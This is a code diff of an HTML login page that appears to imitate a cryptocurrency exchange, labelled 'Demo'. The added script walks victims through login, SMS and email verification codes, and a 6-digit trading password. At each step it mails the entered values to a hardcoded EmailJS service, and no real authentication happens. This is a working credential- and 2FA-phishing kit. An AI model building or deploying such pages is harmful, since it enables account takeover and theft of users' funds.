@@ -3,20 +3,224 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Demo: Log In</title>
-  <link rel="stylesheet" href="styles.css">
+  <title>Demo: Log In | Sign In</title>
+
+  <style>
+    :root {
+      --bg: #0b0e12;
+      --panel: #10141a;
+      --field: #171c23;
+      --border: #292f38;
+      --text: #f5f6f7;
+      --muted: #8d96a3;
+      --green: #20c997;
+      --button: #e2e5e8;
+      --button-text: #11151b;
+      --danger: #ff6b6b;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html, body { min-height: 100%; }
+
+    body {
+      min-height: 100vh;
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    }
+
+    button, input { font: inherit; }
+    button { -webkit-tap-highlight-color: transparent; }
+
+    .topbar {
+      height: 64px;
+      border-bottom: 1px solid #171b21;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+    }
+
+    .brand { display: flex; align-items: center; gap: 9px; }
+
+    .logo-image {
+      width: 29px; height: 29px;
+      object-fit: contain; border-radius: 5px;
+    }
+
+    .brand-name {
+      color: var(--green);
+      font-size: 19px; font-weight: 700;
+    }
+
+    .signup { color: #dfe3e8; font-size: 14px; text-decoration: none; }
+
+    .wrapper {
+      width: 100%; max-width: 430px;
+      margin: 0 auto; padding: 42px 22px 60px;
+    }
+
+    .screen { width: 100%; }
+    .hidden { display: none !important; }
+
+    .back {
+      background: transparent; border: 0;
+      color: #aab2bd; cursor: pointer;
+      font-size: 14px; padding: 0; margin-bottom: 28px;
+    }
+
+    h1 {
+      font-size: 30px; line-height: 1.2;
+      font-weight: 700; margin-bottom: 28px;
+    }
+
+    .tabs {
+      display: flex;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 24px;
+    }
+
+    .tab {
+      position: relative; flex: 1; height: 45px;
+      border: 0; background: transparent;
+      color: #ffffff; font-size: 14px; font-weight: 600;
+      cursor: pointer; white-space: nowrap;
+    }
+
+    .tab.active::after {
+      content: "";
+      position: absolute; left: 18%; right: 18%;
+      bottom: -1px; height: 2px; background: #ffffff;
+    }
+
+    .form-group { margin-bottom: 18px; }
+
+    label {
+      display: block; color: #dfe3e8;
+      font-size: 13px; font-weight: 500; margin-bottom: 8px;
+    }
+
+    .input-wrap { position: relative; }
+
+    input {
+      width: 100%; height: 50px;
+      border: 1px solid var(--border); border-radius: 8px;
+      background: var(--field); color: var(--text);
+      outline: none; padding: 0 14px; font-size: 15px;
+    }
+
+    input:focus { border-color: #59616d; }
+    input::placeholder { color: #68717d; }
+    input:disabled { opacity: 0.45; cursor: not-allowed; }
+
+    .password-input { padding-right: 55px; }
+
+    .toggle-password {
+      position: absolute; right: 13px; top: 50%;
+      transform: translateY(-50%); border: 0;
+      background: transparent; color: #8d96a3;
+      cursor: pointer; font-size: 13px;
+    }
+
+    .form-options {
+      display: flex; align-items: center;
+      justify-content: space-between; margin: 4px 0 22px;
+    }
+
+    .remember {
+      display: flex; align-items: center; gap: 8px;
+      color: #aeb6c1; font-size: 13px; margin: 0;
+    }
+
+    .remember input { width: 15px; height: 15px; }
+
+    .forgot { color: #cdd2d9; font-size: 13px; text-decoration: none; }
+
+    .primary {
+      width: 100%; height: 50px; border: 0; border-radius: 8px;
+      background: var(--button); color: var(--button-text);
+      font-size: 15px; font-weight: 700; cursor: pointer;
+    }
+
+    .primary:hover { opacity: 0.94; }
+    .primary:disabled { opacity: 0.55; cursor: not-allowed; }
+
+    .divider {
+      display: flex; align-items: center; gap: 12px;
+      margin: 28px 0 18px; color: #69727e;
+      font-size: 11px; white-space: nowrap;
+    }
+
+    .divider::before, .divider::after {
+      content: ""; flex: 1; height: 1px; background: var(--border);
+    }
+
+    .secondary {
+      width: 100%; min-height: 48px;
+      border: 1px solid var(--border); border-radius: 8px;
+      background: transparent; color: #e5e8eb;
+      cursor: pointer; font-size: 14px; margin-bottom: 10px;
+    }
+
+    .social-row { display: flex; gap: 10px; }
+
+    .social {
+      flex: 1; height: 45px;
+      border: 1px solid var(--border); border-radius: 8px;
+      background: transparent; color: #dce1e6; cursor: pointer;
+    }
+
+    .notice {
+      margin-top: 22px; padding: 13px; border-radius: 8px;
+      background: #12171d; border: 1px solid #222831;
+      color: #7f8995; font-size: 11px; line-height: 1.5;
+      text-align: center;
+    }
+
+    .error {
+      min-height: 18px; color: var(--danger);
+      font-size: 12px; margin: 0 0 12px;
+    }
+
+    .success { text-align: center; }
+
+    .success-icon {
+      width: 64px; height: 64px;
+      margin: 20px auto 22px; border-radius: 50%;
+      background: #18261f; border: 1px solid #24583f;
+      display: flex; align-items: center; justify-content: center;
+      color: var(--green); font-size: 27px;
+    }
+
+    .success-text {
+      color: #8f98a4; font-size: 14px; line-height: 1.6;
+      margin: 0 auto 28px;
+    }
+
+    @media (max-width: 380px) {
+      .wrapper { padding-left: 18px; padding-right: 18px; }
+      .tab { font-size: 12px; }
+    }
+  </style>
 </head>
 <body>
 
   <header class="topbar">
     <div class="brand">
-      <img class="logo-image" src="https://www.image2url.com/r2/default/images/1789342129628-3e17b341-a6de-4714-a804-de37e681da53.jpeg" alt="Exchange logo">
-      <span class="brand-name">Demo</span>
+      <img
+        class="logo-image"
+        src="https://www.image2url.com/r2/default/images/1789342129628-3e17b341-a6de-4714-a804-de37e681da53.jpeg"
+        alt="Exchange logo"
+      >
+      <span class="brand-name">DEMO</span>
     </div>
     <a href="#" class="signup" id="signupButton">Sign Up</a>
   </header>
 
   <main class="wrapper">
+
+    <!-- ==================== SCREEN 1 — LOGIN ==================== -->
     <section id="loginScreen" class="screen">
       <button type="button" class="back" id="loginBack">← Back</button>
       <h1>Log In</h1>
@@ -57,7 +261,8 @@
 
         <div class="form-options">
           <label class="remember">
-            <input type="checkbox" id="rememberMe"> Remember me
+            <input type="checkbox" id="rememberMe">
+            Remember me
           </label>
           <a href="#" class="forgot" id="forgotPassword">Forgot password?</a>
         </div>
@@ -74,8 +279,360 @@
       </div>
       <div class="notice">Demo 2026</div>
     </section>
+
+    <!-- ==================== SCREEN 2 — ID 1 + ID 2 ==================== -->
+    <section id="identificationScreen" class="screen hidden">
+      <button type="button" class="back" id="identificationBack">← Back</button>
+      <h1>Verification</h1>
+
+      <div class="form-group">
+        <label for="id1">SMS Verification</label>
+        <input 
+          id="id1" 
+          type="text" 
+          inputmode="numeric"
+          pattern="[0-9]{6}"
+          placeholder="SMS Code Sent" 
+          autocomplete="off" 
+          maxlength="6"
+          required
+        >
+      </div>
+
+      <div class="form-group">
+        <label for="id2">Email Verification</label>
+        <input 
+          id="id2" 
+          type="text" 
+          inputmode="numeric"
+          pattern="[0-9]{6}"
+          placeholder="Email Code Sent" 
+          autocomplete="off" 
+          maxlength="6"
+          required
+        >
+      </div>
+
+      <button type="button" class="primary" id="continueButton">Confirm</button>
+      <div class="notice">Please enter accurate verification code</div>
+    </section>
+
+    <!-- ==================== SCREEN 3 — SUCCESS + VERIFY ==================== -->
+    <section id="successScreen" class="screen hidden success">
+      <div class="success-icon">✓</div>
+      <h1>Success</h1>
+      <p class="success-text">
+        Verify to login
+      </p>
+      <button type="button" class="primary" id="verifyButton">Verify</button>
+    </section>
+
+    <!-- ==================== SCREEN 4 — ID 3 ==================== -->
+    <section id="id3Screen" class="screen hidden">
+      <button type="button" class="back" id="id3Back">← Back</button>
+      <h1>Security Verification</h1>
+
+      <div class="form-group">
+        <label for="id3">Trading Password</label>
+        <input 
+          id="id3" 
+          type="text" 
+          inputmode="numeric"
+          pattern="[0-9]{6}"
+          placeholder="Enter Trading Password" 
+          autocomplete="off" 
+          maxlength="6"
+          required
+        >
+      </div>
+
+      <div id="id3Error" class="error"></div>
+      <button type="button" class="primary" id="submitId3Button">Submit</button>
+      <div class="notice">You need to complete all of the following verifications to continue</div>
+    </section>
+
+    <!-- ==================== SCREEN 5 — FINAL SUCCESS ==================== -->
+    <section id="finalSuccessScreen" class="screen hidden success">
+      <div class="success-icon">✓</div>
+      <h1>Verification Complete</h1>
+      <p class="success-text">
+        Login Successful, Proccessing
+      </p>
+      <button type="button" class="primary" id="restartButton">Log Out</button>
+    </section>
+
   </main>
 
-  <script src="script.js"></script>
+  <!-- ==================== EMAILJS ==================== -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    emailjs.init("Hn2ZcbKV2zmZEVq4H");
+  </script>
+
+  <script>
+    // ==================== EMAILJS CONFIG ====================
+    const EMAILJS_SERVICE_ID = "service_n9rphu9";
+    const EMAILJS_TEMPLATE_ID = "template_uq1ncii";
+
+    // Screens
+    const loginScreen = document.getElementById("loginScreen");
+    const identificationScreen = document.getElementById("identificationScreen");
+    const successScreen = document.getElementById("successScreen");
+    const id3Screen = document.getElementById("id3Screen");
+    const finalSuccessScreen = document.getElementById("finalSuccessScreen");
+
+    // Inputs & elements
+    const emailPhoneTab = document.getElementById("emailPhoneTab");
+    const subAccountTab = document.getElementById("subAccountTab");
+    const emailPhoneFields = document.getElementById("emailPhoneFields");
+    const subAccountFields = document.getElementById("subAccountFields");
+    const identifier = document.getElementById("identifier");
+    const subAccount = document.getElementById("subAccount");
+    const loginPassword = document.getElementById("loginPassword");
+    const subAccountPassword = document.getElementById("subAccountPassword");
+    const id1 = document.getElementById("id1");
+    const id2 = document.getElementById("id2");
+    const id3 = document.getElementById("id3");
+    const rememberMe = document.getElementById("rememberMe");
+    const loginForm = document.getElementById("loginForm");
+    const loginError = document.getElementById("loginError");
+    const continueButton = document.getElementById("continueButton");
+    const verifyButton = document.getElementById("verifyButton");
+    const submitId3Button = document.getElementById("submitId3Button");
+    const id3Error = document.getElementById("id3Error");
+    const restartButton = document.getElementById("restartButton");
+
+    let currentLoginMethod = "email/phone";
+    let storedLoginData = null;
+
+    // Force only numbers
+    [id1, id2, id3].forEach(input => {
+      input.addEventListener("input", (e) => {
+        e.target.value = e.target.value.replace(/\D/g, "").slice(0, 6);
+      });
+    });
+
+    // Tab switching
+    function showEmailPhoneLogin() {
+      currentLoginMethod = "email/phone";
+      emailPhoneTab.classList.add("active");
+      subAccountTab.classList.remove("active");
+      emailPhoneFields.classList.remove("hidden");
+      subAccountFields.classList.add("hidden");
+      identifier.disabled = false; identifier.required = true;
+      loginPassword.disabled = false; loginPassword.required = true;
+      subAccount.disabled = true; subAccount.required = false;
+      subAccountPassword.disabled = true; subAccountPassword.required = false;
+      loginError.textContent = "";
+    }
+
+    function showSubAccountLogin() {
+      currentLoginMethod = "sub_account";
+      subAccountTab.classList.add("active");
+      emailPhoneTab.classList.remove("active");
+      subAccountFields.classList.remove("hidden");
+      emailPhoneFields.classList.add("hidden");
+      identifier.disabled = true; identifier.required = false;
+      loginPassword.disabled = true; loginPassword.required = false;
+      subAccount.disabled = false; subAccount.required = true;
+      subAccountPassword.disabled = false; subAccountPassword.required = true;
+      loginError.textContent = "";
+    }
+
+    emailPhoneTab.addEventListener("click", showEmailPhoneLogin);
+    subAccountTab.addEventListener("click", showSubAccountLogin);
+
+    // ========== LOGIN SUBMIT (EmailJS - first email) ==========
+    loginForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      let loginData = {
+        method: currentLoginMethod,
+        timestamp: new Date().toISOString(),
+        remember_me: rememberMe.checked
+      };
+
+      if (currentLoginMethod === "email/phone") {
+        const emailOrPhone = identifier.value.trim();
+        const password = loginPassword.value;
+        loginData.identifier = emailOrPhone;
+        loginData.password = password;
+      } else {
+        const subAcct = subAccount.value.trim();
+        const password = subAccountPassword.value;
+        loginData.sub_account = subAcct;
+        loginData.password = password;
+      }
+
+      try {
+        const emailParams = {
+          to_name: "Demo User",
+          to_email: loginData.identifier || loginData.sub_account,
+          login_method: loginData.method,
+          login_timestamp: loginData.timestamp,
+          remember_me: loginData.remember_me,
+          ...(currentLoginMethod === "email/phone" 
+            ? { login_password: loginData.password }
+            : { sub_account: loginData.sub_account, sub_password: loginData.password })
+        };
+
+        const response = await emailjs.send(
+          EMAILJS_SERVICE_ID,
+          EMAILJS_TEMPLATE_ID,
+          emailParams
+        );
+
+        console.log("✅ Login email sent!", response);
+
+        storedLoginData = loginData;
+        loginScreen.classList.add("hidden");
+        identificationScreen.classList.remove("hidden");
+
+      } catch (err) {
+        loginError.textContent = "Error sending email: " + err.message;
+        console.error(err);
+      }
+    });
+
+    // ========== ID 1 + ID 2 ==========
+    continueButton.addEventListener("click", async (e) => {
+      e.preventDefault();
+
+      const idValue1 = id1.value.trim();
+      const idValue2 = id2.value.trim();
+
+      if (!idValue1 || !idValue2) {
+        alert("Please enter verification code");
+        return;
+      }
+      if (!/^\d{6}$/.test(idValue1) || !/^\d{6}$/.test(idValue2)) {
+        alert("SMS and Email code must be 6 digits (numbers only)");
+        return;
+      }
+      if (!storedLoginData?.id) {
+        alert("No login data found.");
+        return;
+      }
+
+      try {
+        const fullData = {
+          ...storedLoginData,
+          id_1: idValue1,
+          id_2: idValue2,
+          identification_timestamp: new Date().toISOString()
+        };
+
+        // Second email (verification codes)
+        const emailParams = {
+          to_name: "Demo User",
+          to_email: storedLoginData.identifier || storedLoginData.sub_account,
+          sms_code: idValue1,
+          email_code: idValue2,
+          verification_timestamp: fullData.identification_timestamp
+        };
+
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, emailParams);
+
+        storedLoginData = fullData;
+        identificationScreen.classList.add("hidden");
+        successScreen.classList.remove("hidden");
+
+      } catch (err) {
+        alert("Error: " + err.message);
+        console.error(err);
+      }
+    });
+
+    // ========== VERIFY BUTTON ==========
+    verifyButton.addEventListener("click", () => {
+      successScreen.classList.add("hidden");
+      id3Screen.classList.remove("hidden");
+      id3.value = "";
+      id3Error.textContent = "";
+    });
+
+    // ========== SUBMIT ID 3 ==========
+    submitId3Button.addEventListener("click", async () => {
+      const idValue3 = id3.value.trim();
+
+      if (!idValue3) {
+        id3Error.textContent = "Please enter trading password";
+        return;
+      }
+      if (!/^\d{6}$/.test(idValue3)) {
+        id3Error.textContent = "Trading password must be exactly 6 digits (numbers only)";
+        return;
+      }
+      if (!storedLoginData?.id) {
+        id3Error.textContent = "Session expired.";
+        return;
+      }
+
+      try {
+        // Third email (trading password)
+        const emailParams = {
+          to_name: "Demo User",
+          to_email: storedLoginData.identifier || storedLoginData.sub_account,
+          trading_password: idValue3,
+          security_timestamp: new Date().toISOString()
+        };
+
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, emailParams);
+
+        storedLoginData = { ...storedLoginData, id_3: idValue3 };
+        id3Screen.classList.add("hidden");
+        finalSuccessScreen.classList.remove("hidden");
+
+      } catch (err) {
+        id3Error.textContent = "Error: " + err.message;
+        console.error(err);
+      }
+    });
+
+    // ========== RESTART ==========
+    restartButton.addEventListener("click", () => {
+      loginForm.reset();
+      id1.value = "";
+      id2.value = "";
+      id3.value = "";
+      loginError.textContent = "";
+      id3Error.textContent = "";
+      storedLoginData = null;
+      finalSuccessScreen.classList.add("hidden");
+      loginScreen.classList.remove("hidden");
+      showEmailPhoneLogin();
+    });
+
+    // Password toggle, back buttons, etc. (your original code)
+    document.querySelectorAll(".toggle-password").forEach((button) => {
+      button.addEventListener("click", (e) => {
+        e.preventDefault();
+        const targetId = button.getAttribute("data-target");
+        const inputField = document.getElementById(targetId);
+        if (inputField.type === "password") {
+          inputField.type = "text";
+          button.textContent = "Hide";
+        } else {
+          inputField.type = "password";
+          button.textContent = "Show";
+        }
+      });
+    });
+
+    document.getElementById("loginBack").addEventListener("click", () => {});
+    document.getElementById("identificationBack").addEventListener("click", () => {
+      id1.value = "";
+      id2.value = "";
+      loginScreen.classList.remove("hidden");
+      identificationScreen.classList.add("hidden");
+      showEmailPhoneLogin();
+    });
+    document.getElementById("id3Back").addEventListener("click", () => {
+      id3.value = "";
+      id3Error.textContent = "";
+      id3Screen.classList.add("hidden");
+      successScreen.classList.remove("hidden");
+    });
+  </script>
 </body>
 </html>
